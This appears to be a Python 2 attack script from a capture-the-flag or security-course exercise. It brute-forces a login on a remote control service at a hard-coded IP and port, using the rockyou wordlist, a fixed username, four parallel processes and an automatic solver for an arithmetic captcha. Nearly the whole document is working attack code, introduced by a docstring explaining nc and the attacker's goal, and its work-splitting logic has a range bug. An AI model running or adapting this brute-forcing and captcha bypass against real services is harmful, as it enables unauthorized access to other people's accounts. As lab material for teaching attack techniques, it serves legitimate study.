"""
    If you know the IP address of v0idcache's server and you
    know the port number of the service you are trying to connect
    to, you can use nc or telnet in your Linux terminal to interface
    with the server. To do so, run:

        $ nc <ip address here> <port here>

    In the above the example, the $-sign represents the shell, nc is the command
    you run to establish a connection with the server using an explicit IP address
    and port number.

    If you have the discovered the IP address and port number, you should discover
    that there is a remote control service behind a certain port. You will know you
    have discovered the correct port if you are greeted with a login prompt when you
    nc to the server.

    In this Python script, we are mimicking the same behavior of nc'ing to the remote
    control service, however we do so in an automated fashion. This is because it is
    beneficial to script the process of attempting multiple login attempts, hoping that
    one of our guesses logs us (the attacker) into the Briong server.

    Feel free to optimize the code (ie. multithreading, etc) if you feel it is necessary.

"""

import socket
import re
import time
from multiprocessing import Process

host = "157.230.179.99" # IP address here
port = 1337 # Port here
wordlist = "/usr/share/wordlists/rockyou.txt" # Point to wordlist file

def brute_force():
    """
        Sockets: https://docs.python.org/2/library/socket.html
        How to use the socket s:

            # Establish socket connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))

            Reading:

                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
                print(data)             # Prints data

            Sending:

                s.send("something to send\n")   # Send a newline \n at the end of your command

        General idea:

            Given that you know a potential username, use a wordlist and iterate
            through each possible password and repeatedly attempt to login to
            v0idcache's server.
    """

    f = open(wordlist, "r")
    lines = f.readlines()
    p1 = Process(target=guess, args=(0,len(lines)/4,lines,))
    p2 = Process(target=guess, args=(len(lines)/4+1,len(lines)/4,lines,))
    p3 = Process(target=guess, args=(len(lines)/2+1,3*len(lines)/4,lines,))
    p4 = Process(target=guess, args=(3*len(lines)/4+1,len(lines),lines,))
    
    p1.start()
    p2.start()
    p3.start()
    p4.start()

    p1.join()
    p2.join()
    p3.join()
    p4.join()
   #guess(0,len(lines),lines)

def guess (start, end, lines):
    username = "ejnorman84"

    for pwd in lines[start:end]:
        flag = False
        s = 0
        while not flag: 
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            time.sleep(0.1)
            flag = beatcaptcha(s)
            if not flag:
                s.close()
        s.recv(1024)
        s.send(username + "\n")
        time.sleep(0.05)
        s.recv(1024)
        s.send(pwd)
        response = s.recv(1024)
        while response == "\n" or response == "" or response == " ":
            time.sleep(0.05)
            response = s.recv(1024)
        if not re.search("Fail", response):
            print(pwd + "                     success?")
            print response
            s.close()
        s.close()




def beatcaptcha (s):
    captcha = s.recv(1024)
#   print captcha
    num = re.findall("\d+", captcha)
#   print num
    try:
        op = re.search("[+-/*]", captcha).group(0)
    except:
        return False
    x = 0;

    if op == "+":
        x = int(num[0]) + int(num[1])
    if op == "-":
        x = int(num[0]) - int(num[1])
    if op == "/":
        x = int(num[0]) / int(num[1])
    if op == "*":
        x = int(num[0]) * int(num[1])

    s.send(str(x) + "\n")
#   print("sent " + str(x))
    return True


if __name__ == '__main__':
    brute_force()
